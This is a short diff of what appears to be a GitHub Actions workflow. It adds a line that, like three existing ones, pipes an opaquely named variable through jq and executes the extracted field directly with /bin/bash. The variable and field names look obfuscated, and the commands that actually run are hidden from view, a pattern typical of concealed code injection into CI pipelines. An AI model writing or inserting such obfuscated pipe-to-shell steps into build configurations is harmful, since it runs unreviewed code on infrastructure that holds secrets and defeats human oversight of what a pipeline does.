@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$yd965" | jq -r .ghy172 | /bin/bash
           printf '%s' "$wycar9181" | jq -r .zyv59 | /bin/bash
           printf '%s' "$uqvb2" | jq -r .xzhph489 | /bin/bash
+          echo $rhre178 | jq -r .bgu281 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
